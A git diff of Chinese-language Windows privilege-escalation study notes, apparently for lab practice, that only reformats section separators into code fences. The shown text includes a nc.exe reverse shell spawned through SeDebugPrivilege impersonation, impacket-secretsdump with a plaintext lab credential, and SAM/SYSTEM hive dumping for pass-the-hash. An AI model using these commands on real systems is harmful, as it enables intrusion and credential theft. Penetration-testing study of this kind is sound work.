@@ -396,7 +396,8 @@ dll提权就是我们对于.exe文件没有修改权限，但是对他调用的d
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP" 
 最后的那个就是我们想的版本，尽量用高版本,详细看
 https://blog.csdn.net/qq_42699326/article/details/144334216?ops_request_misc=elastic_search_misc&request_id=259c7e6dd931c1ea276a731697c504c9&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-144334216-null-null.142^v102^pc_search_result_base5&utm_term=windows%E5%9C%9F%E8%B1%86%E7%B3%BB%E5%88%97%E6%8F%90%E6%9D%83&spm=1018.2226.3001.4187
--------------------------------------------------------------------------------------------
+```
+```bash
 4.2 SeDebugPrivilege 权限
 输入 whoami /priv 出现SeDebugPrivilege权限，就相当于可以调试其他程序，如果有adminstrator的进程可以调试，就可以进行提权
 whoami /priv  # 查看权限
@@ -408,10 +409,12 @@ upload nc.exe # 上传nc.exe
 ipmo .\/psgetsys.ps1
 ImpersonateFromParentPid -ppid 556 -command "c:\windows\system32\cmd.exe" -cmdargs "/c C:\Users\alaading\Documents\nc.exe ip port -e cmd"
 # 后面这个就是反弹shell，nc位置和自己的ip，port设置好
-------------------------------------------------------------------------------------------
+```
+```bash
 4.3 SeManageVolumePrivilege 权限
 whoami /priv 如果显示 SeManageVolumePrivilege ,可以使用 SeManageVolumeExploit.exe 文件提权。上传后使用即可。
-------------------------------------------------------------------------------------------
+```
+```bash
 4.4 SeRestorePrivilege权限
 whoami /priv 如果显示 SeRestorePrivilege ，可以使用EnableSeRestorePrivilege.ps1 文件提权
 或者SharpGPOAbuse.exe提权
@@ -425,7 +428,8 @@ whoami /priv 如果显示 SeRestorePrivilege ，可以使用EnableSeRestorePrivi
 
 impacket-secretsdump vault.offsec/anirudh:SecureHM@192.168.208.172
 # 抓取hash
------------------------------------------------------------------------------------------
+```
+```bash
 4.5 SeBackupPrivilege 和 SeRestorePrivilege
 # 我们可以把sam，system转储出来，破解administrator的hash值，接着利用PTH进行哈希传递攻击，从而获取administrator权限
 PS: reg save hklm\sam c:\temp\sam
